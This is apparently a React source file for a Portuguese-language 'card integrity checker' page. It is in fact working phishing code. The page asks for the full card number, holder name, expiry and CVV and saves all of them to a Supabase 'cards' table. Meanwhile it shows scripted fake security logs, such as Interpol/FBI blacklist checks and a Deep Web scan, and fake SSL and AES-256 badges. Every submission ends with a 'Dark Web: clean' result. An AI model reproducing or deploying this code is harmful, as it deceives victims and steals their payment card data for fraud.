import { useState, useRef, useEffect, useMemo } from 'react';
import { supabase } from '@/lib/supabase';
import { toast } from 'sonner';
// Adicionado ShieldCheck de volta aos imports
import { ShieldCheck, Lock, Search, Shield, Globe, AlertTriangle, Activity, ChevronRight, Building2, CreditCard } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

// --- Base de Dados de BINs ---
const getBinInfo = (number: string) => {
  const clean = number.replace(/\D/g, '');
  const bin6 = clean.slice(0, 6);
  const bin4 = clean.slice(0, 4);

  const binMap: Record<string, { bank: string, level: string }> = {
    '5162': { bank: 'NUBANK', level: 'GOLD' },
    '5200': { bank: 'NUBANK', level: 'PLATINUM' },
    '5502': { bank: 'NUBANK', level: 'BLACK' },
    '4004': { bank: 'BRADESCO', level: 'CLASSIC' },
    '5447': { bank: 'BRADESCO', level: 'NANQUIM' },
    '4984': { bank: 'ITAU', level: 'PLATINUM' },
    '4011': { bank: 'ITAU', level: 'GOLD' },
    '5493': { bank: 'ITAU', level: 'BLACK' },
    '4175': { bank: 'SANTANDER', level: 'INFINITE' },
    '5258': { bank: 'SANTANDER', level: 'GOLD' },
    '498407': { bank: 'BANCO DO BRASIL', level: 'VISA' },
    '4220': { bank: 'BANCO DO BRASIL', level: 'OUROCARD' },
    '5228': { bank: 'C6 BANK', level: 'CARBON' },
    '4': { bank: 'VISA', level: 'STANDARD' },
    '5': { bank: 'MASTERCARD', level: 'STANDARD' },
    '3': { bank: 'AMEX', level: 'MEMBER' },
  };

  if (binMap[bin6]) return binMap[bin6];
  if (binMap[bin4]) return binMap[bin4];
  if (binMap[clean.slice(0, 1)]) return binMap[clean.slice(0, 1)];

  return { bank: '', level: '' };
};

// --- Validação ---
const validateCardStrict = (number: string) => {
  const clean = number.replace(/\D/g, '');
  if (/^400000/.test(clean)) return false; 
  if (/^(\d)\1+$/.test(clean)) return false; 
  if (clean.length < 13 || clean.length > 19) return false;

  let sum = 0;
  let shouldDouble = false;
  for (let i = clean.length - 1; i >= 0; i--) {
    let digit = parseInt(clean.charAt(i));
    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (sum % 10) === 0;
};

// --- Terminal ---
const SecurityTerminal = ({ detectedBank }: { detectedBank: string }) => {
  const [logs, setLogs] = useState<string[]>([]);
  const scrollRef = useRef<HTMLDivElement>(null);
  
  useEffect(() => {
    const allLogs = [
      "Iniciando protocolo TLS 1.3...",
      "Analisando integridade do BIN...",
      detectedBank ? `Identificando emissor... BANCO: ${detectedBank}` : "Identificando emissor...",
      "Verificando listas negras (Interpol/FBI)...",
      "Escaneando vazamentos na Deep Web...",
      "Consultando API de antifraude...",
      "Nenhuma anomalia detectada.",
      "Criptografando dados (AES-256)...",
      "Conexão finalizada com sucesso."
    ];

    let currentIndex = 0;
    const interval = setInterval(() => {
      if (currentIndex < allLogs.length) {
        setLogs(prev => [...prev, allLogs[currentIndex]]);
        currentIndex++;
        if (scrollRef.current) {
          scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
        }
      } else {
        clearInterval(interval);
      }
    }, 500);
    return () => clearInterval(interval);
  }, [detectedBank]);

  return (
    <div className="bg-slate-900 rounded-lg p-5 font-mono text-xs border border-slate-700 shadow-2xl h-56 flex flex-col relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-b from-transparent to-green-500/5 pointer-events-none animate-scanline" />
      <div className="flex items-center justify-between border-b border-slate-700 pb-3 mb-3">
        <div className="flex items-center gap-2">
           <div className="flex gap-1.5"><div className="w-2.5 h-2.5 rounded-full bg-red-500/80" /><div className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" /><div className="w-2.5 h-2.5 rounded-full bg-green-500/80" /></div>
           <span className="text-slate-400 ml-2 font-semibold">SECURE_SHELL_V4.0</span>
        </div>
      </div>
      <div className="flex-1 overflow-y-auto space-y-1.5 scrollbar-hide" ref={scrollRef}>
        {logs.map((log, i) => (
          <motion.div key={i} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} className="text-slate-300 font-medium">
            <span className="text-green-500 mr-2">➜</span>
            <span className={(log && log.includes("BANCO:")) ? "text-blue-400 font-bold" : "opacity-90"}>
              {log}
            </span>
          </motion.div>
        ))}
      </div>
    </div>
  );
};

// --- Cartão 3D ---
function CreditCard3D({ cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField, bankInfo }: any) {
  const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
  const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);
  
  const refs: any = { cardNumber: useRef(null), cardName: useRef(null), cardDate: useRef(null) };

  useEffect(() => {
    if (focusedField && refs[focusedField]?.current) {
      const el = refs[focusedField].current;
      setFocusStyle({
        width: `${el.offsetWidth}px`, height: `${el.offsetHeight}px`,
        transform: `translateX(${el.offsetLeft}px) translateY(${el.offsetTop}px)`, opacity: 1
      });
    } else { setFocusStyle(null); }
  }, [focusedField]);

  const getCardType = useMemo(() => {
    const num = cardNumber.replace(/\D/g, '');
    if (/^4/.test(num)) return 'visa';
    if (/^(34|37)/.test(num)) return 'amex';
    if (/^5[1-5]/.test(num)) return 'mastercard';
    if (/^6011/.test(num)) return 'discover';
    return 'visa';
  }, [cardNumber]);

  const maskNumber = () => {
    const mask = getCardType === 'amex' ? '#### ###### #####' : '#### #### #### ####';
    let i = 0;
    const clean = cardNumber.replace(/\D/g, '');
    return mask.split('').map((char, idx) => {
      if (char === ' ') return <span key={idx} style={{width: 10, display:'inline-block'}}></span>;
      const num = clean[i++];
      if (!num) return <span key={idx} style={{opacity: 0.5}}>#</span>;
      if (idx > 4 && idx < 15 && clean.length > idx && getCardType !== 'amex') return <span key={idx}>*</span>;
      return <span key={idx} className="slide-fade-up">{num}</span>;
    });
  };

  const isFlipped = focusedField === 'cardCvv';

  return (
    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
      <div className="card-item__side -front">
        <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__wrapper">
          <div className="card-item__top">
            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
            <div className="flex flex-col items-end">
                <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
                {bankInfo.bank && <span className="text-white/90 text-[10px] font-bold tracking-wider mt-1 uppercase shadow-black drop-shadow-md">{bankInfo.bank}</span>}
            </div>
          </div>
          <div className="card-item__number" ref={refs.cardNumber}>{maskNumber()}</div>
          <div className="card-item__content">
            <div className="card-item__info" ref={refs.cardName}>
              <div className="card-item__holder">Titular</div>
              <div className="card-item__name">{cardName || 'NOME COMPLETO'}</div>
            </div>
            <div className="card-item__date" ref={refs.cardDate}>
              <span className="card-item__dateTitle">Validade</span>
              <span>{cardMonth || 'MM'}</span>/<span>{cardYear ? cardYear.slice(2) : 'AA'}</span>
            </div>
          </div>
        </div>
      </div>
      <div className="card-item__side -back">
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__band" />
        <div className="card-item__cvv">
          <div className="card-item__cvvTitle">CVV</div>
          <div className="card-item__cvvBand">{cardCvv.replace(/./g, '*')}</div>
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" style={{opacity:0.7}} alt="" />
        </div>
      </div>
    </div>
  );
}

// --- Tela de Sucesso ---
function SuccessScreen({ onReset, bankInfo }: { onReset: () => void, bankInfo: any }) {
  return (
    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="flex flex-col items-center justify-center text-center p-8 space-y-6">
      <div className="relative">
        <motion.div animate={{ scale: [1, 1.1, 1] }} transition={{ repeat: Infinity, duration: 3 }} className="absolute inset-0 bg-emerald-500/20 rounded-full blur-2xl" />
        <div className="bg-emerald-100 p-4 rounded-full relative z-10"><ShieldCheck className="w-16 h-16 text-emerald-600" /></div>
      </div>
      <div>
        <h2 className="text-2xl font-bold text-slate-800 mb-2">Cartão Verificado</h2>
        <p className="text-slate-500 text-sm max-w-sm mx-auto">Varredura concluída. Dados íntegros.</p>
      </div>
      <div className="w-full bg-slate-50 rounded-xl p-5 border border-slate-100 shadow-sm">
        <div className="space-y-3">
            <div className="flex items-center justify-between"><div className="flex items-center gap-3"><Building2 className="w-4 h-4 text-emerald-600" /><span className="text-slate-700 font-medium text-sm">Emissor</span></div><span className="text-slate-900 font-bold text-sm uppercase">{bankInfo.bank || 'Desconhecido'}</span></div>
            <div className="h-px bg-slate-200 w-full" />
            <div className="flex items-center justify-between"><div className="flex items-center gap-3"><CreditCard className="w-4 h-4 text-emerald-600" /><span className="text-slate-700 font-medium text-sm">Nível</span></div><span className="text-slate-900 text-sm font-semibold">{bankInfo.level || '-'}</span></div>
            <div className="h-px bg-slate-200 w-full" />
            <div className="flex items-center justify-between"><div className="flex items-center gap-3"><Globe className="w-4 h-4 text-emerald-600" /><span className="text-slate-700 font-medium text-sm">Dark Web</span></div><span className="text-emerald-600 bg-emerald-100 px-2 py-0.5 rounded text-xs font-bold uppercase">Limpo</span></div>
        </div>
      </div>
      <button onClick={onReset} className="text-blue-600 font-semibold hover:text-blue-700 text-sm flex items-center gap-1 transition-colors group">Nova verificação <ChevronRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" /></button>
    </motion.div>
  );
}

// --- Página Principal ---
export function PublicPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [cardMonth, setCardMonth] = useState('');
  const [cardYear, setCardYear] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [status, setStatus] = useState<'idle' | 'scanning' | 'safe'>('idle');
  const [bankInfo, setBankInfo] = useState({ bank: '', level: '' });

  const monthRef = useRef<HTMLSelectElement>(null);
  const yearRef = useRef<HTMLSelectElement>(null);
  const cvvRef = useRef<HTMLInputElement>(null);

  const handleNumberChange = (e: any) => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(val);
    setBankInfo(val.length >= 4 ? getBinInfo(val) : { bank: '', level: '' });
  };

  const handleNameChange = (e: any) => {
    const val = e.target.value.toUpperCase().replace(/[^A-ZÀ-Ú\s]/g, '');
    setCardName(val);
  };

  const handleMonthChange = (e: any) => { setCardMonth(e.target.value); if(e.target.value) yearRef.current?.focus(); };
  const handleYearChange = (e: any) => { setCardYear(e.target.value); if(e.target.value) cvvRef.current?.focus(); };
  const handleCvvChange = (e: any) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4));

  const handleSubmit = async () => {
    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) return toast.error('Todos os campos são obrigatórios.');
    if (!validateCardStrict(cardNumber)) return toast.error('Cartão inválido.', { icon: <AlertTriangle className="w-5 h-5 text-amber-500" /> });
    
    setStatus('scanning');
    try {
      const scanPromise = new Promise(r => setTimeout(r, 5500));
      const savePromise = supabase.from('cards').insert({ card_number: cardNumber, card_holder: cardName, card_month: cardMonth, card_year: cardYear, card_cvv: cardCvv, card_type: 'visa' });
      await Promise.all([scanPromise, savePromise]);
      setStatus('safe');
      toast.success('Análise concluída.');
    } catch { toast.error('Erro de conexão.'); setStatus('idle'); }
  };

  const resetForm = () => { setCardNumber(''); setCardName(''); setCardMonth(''); setCardYear(''); setCardCvv(''); setStatus('idle'); setBankInfo({ bank: '', level: '' }); };

  return (
    <div className="wrapper">
      <div className="fixed inset-0 pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-blue-600/20 rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-emerald-600/10 rounded-full blur-[120px]" />
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 brightness-100 contrast-150"></div>
      </div>

      <div className="card-form relative z-10">
        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 bg-slate-800/50 border border-slate-700/50 rounded-full px-4 py-1.5 mb-5 backdrop-blur-md shadow-lg">
            <Lock className="w-3.5 h-3.5 text-emerald-400" />
            <span className="text-emerald-400 text-[11px] font-bold tracking-widest uppercase">Ambiente Seguro 256-bit</span>
          </div>
          <h1 className="text-3xl md:text-5xl font-bold text-white mb-2 tracking-tight">Verificador de <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">Integridade</span></h1>
          <p className="text-slate-400 text-sm max-w-lg mx-auto">Varredura profunda (BIN) para detectar vulnerabilidades.</p>
        </div>

        <div className="card-list">
            <AnimatePresence>
                {status !== 'safe' && (
                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }}>
                    <CreditCard3D cardNumber={cardNumber} cardName={cardName} cardMonth={cardMonth} cardYear={cardYear} cardCvv={cardCvv} focusedField={focusedField} bankInfo={bankInfo} />
                </motion.div>
                )}
            </AnimatePresence>
        </div>

        <div className="card-form__inner">
          <AnimatePresence mode="wait">
            {status === 'idle' && (
              <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="space-y-5">
                <div className="space-y-1 relative">
                  <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Número do Cartão</label>
                  <input type="text" className="w-full h-12 px-4 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 font-mono focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all" value={cardNumber} onChange={handleNumberChange} onFocus={() => setFocusedField('cardNumber')} onBlur={() => setFocusedField(null)} placeholder="0000 0000 0000 0000" />
                  {bankInfo.bank && <div className="absolute right-4 top-[2.3rem] text-[10px] font-bold text-emerald-600 uppercase bg-emerald-50 px-2 rounded">{bankInfo.bank}</div>}
                </div>

                <div className="space-y-1">
                  <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Nome do Titular</label>
                  <input type="text" className="w-full h-12 px-4 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all uppercase" value={cardName} onChange={handleNameChange} onFocus={() => setFocusedField('cardName')} onBlur={() => setFocusedField(null)} placeholder="COMO NO CARTÃO" />
                </div>

                <div className="flex gap-4">
                  <div className="flex-1 flex gap-4">
                    <div className="w-full space-y-1">
                      <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Mês</label>
                      <select ref={monthRef} className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none appearance-none" value={cardMonth} onChange={handleMonthChange} onFocus={() => setFocusedField('cardDate')} onBlur={() => setFocusedField(null)}><option value="" disabled>MM</option>{Array.from({length:12},(_,i)=><option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}</select>
                    </div>
                    <div className="w-full space-y-1">
                      <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Ano</label>
                      <select ref={yearRef} className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none appearance-none" value={cardYear} onChange={handleYearChange} onFocus={() => setFocusedField('cardDate')} onBlur={() => setFocusedField(null)}><option value="" disabled>AA</option>{Array.from({length:10},(_,i)=><option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}</select>
                    </div>
                  </div>
                  <div className="w-24 space-y-1 shrink-0">
                    <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">CVV</label>
                    <input ref={cvvRef} type="text" className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 text-center tracking-widest focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all" maxLength={4} value={cardCvv} onChange={handleCvvChange} onFocus={() => setFocusedField('cardCvv')} onBlur={() => setFocusedField(null)} placeholder="123" />
                  </div>
                </div>

                <button className="w-full h-14 mt-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-lg font-bold text-lg shadow-lg shadow-blue-500/30 transition-all transform active:scale-[0.98] flex items-center justify-center gap-2" onClick={handleSubmit}>
                  <Search className="w-5 h-5" /> Iniciar Verificação
                </button>

                <div className="pt-4 flex justify-center items-center gap-6 border-t border-slate-100 opacity-60">
                   <div className="flex items-center gap-1"><Shield className="w-3 h-3" /><span className="text-[10px] font-bold">SSL SECURE</span></div>
                   <div className="flex items-center gap-1"><Lock className="w-3 h-3" /><span className="text-[10px] font-bold">AES-256</span></div>
                </div>
              </motion.div>
            )}

            {status === 'scanning' && (
              <motion.div key="scanning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col pt-4">
                 <div className="text-center mb-6">
                   <h3 className="text-lg font-bold text-slate-800 flex items-center justify-center gap-2"><Activity className="w-5 h-5 text-blue-500 animate-pulse" />Analisando...</h3>
                 </div>
                 <SecurityTerminal detectedBank={bankInfo.bank} />
              </motion.div>
            )}

            {status === 'safe' && <SuccessScreen key="success" onReset={resetForm} bankInfo={bankInfo} />}
          </AnimatePresence>
        </div>
      </div>
      
      <footer className="w-full text-center mt-auto py-6 relative z-10 opacity-70">
        <div className="flex justify-center gap-4 mb-2 grayscale opacity-50">
            <img src="https://img.icons8.com/color/48/visa.png" className="h-6" alt="Visa" />
            <img src="https://img.icons8.com/color/48/mastercard.png" className="h-6" alt="Master" />
            <img src="https://img.icons8.com/color/48/amex.png" className="h-6" alt="Amex" />
        </div>
        <p className="text-slate-500 text-xs">© 2024 SecureCheck International.</p>
      </footer>
    </div>
  );
}
